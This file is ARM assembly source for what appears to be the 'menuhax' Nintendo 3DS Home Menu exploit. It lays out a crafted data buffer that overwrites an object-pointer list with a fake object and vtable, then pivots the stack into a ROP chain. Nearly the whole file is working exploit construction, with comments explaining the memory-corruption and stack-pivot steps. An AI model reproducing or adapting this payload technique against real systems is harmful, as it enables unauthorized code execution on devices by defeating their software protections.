.arm
.section .init
.global _start

#include "menuhax_ropinclude.s"

#define TOTAL_HAX_ICONS 60 //Use the last 60 available "icons".

_start:

@ End of the titleID array.
.fill (((_start + 0x8 + ((360-TOTAL_HAX_ICONS)*8)) - .) / 4), 4, 0xffffffff
.word HEAPBUF + (object - _start), 0x55667788 @ These two words(as a "titleID") overwrite the target_objectslist_buffer. The rest of the "titleIDs" here aren't used by Home Menu due to the s16 values below. This buffer contains a list of object-ptrs which gets used with a vtable-funcptr +16 call. This jumps to ROP_LOADR4_FROMOBJR0 which then uses the same stack-pivot method as menuhax_payload.s.

object:
.word HEAPBUF + (vtable - _start) @ object+0, vtable ptr
.word 0
.word 0
.word 0

.word HEAPBUF + ((object + 0x20) - _start) @ This .word is at object+0x10. ROP_LOADR4_FROMOBJR0 loads r4 from here.

.space ((object + 0x1c) - .) @ sp/pc data loaded by STACKPIVOT_ADR.
stackpivot_sploadword:
.word HEAPBUF + (ropstackstart - _start) @ sp
stackpivot_pcloadword:
.word ROP_POPPC @ pc

vtable:
.word 0, 0 @ vtable+0
.word 0
.word STACKPIVOT_ADR @ vtable funcptr +12, called via ROP_LOADR4_FROMOBJR0.
.word ROP_LOADR4_FROMOBJR0 @ vtable funcptr +16

ropstackstart:
.word 0x40506070

.word 0x0 @ Padding

@ Pad to the start of the s16 array, to make sure the above data doesn't get too large.
.space ((_start + 0xcb0) - .)

@ End of the s16 array.
.space ((_start + 0xcb0 + ((360-TOTAL_HAX_ICONS)*2)) - .)
.hword 0x5848 @ Offset value, menuhax_manager detects this special value and uses the required value instead.
#if TOTAL_HAX_ICONS > 1
.fill TOTAL_HAX_ICONS-1, 2, 0xfffe @ Use 0xfffe for the rest of these, so that the titleID doesn't get used.
#endif

@ End of the s8 array.
.space ((_start + 0xf80 + (360-TOTAL_HAX_ICONS)) - .)
.fill TOTAL_HAX_ICONS, 1, 0xff @ Normally this is 0xff, but write this anyway since it's required for this hax.

.space ((_start + 0x2da0) - .)

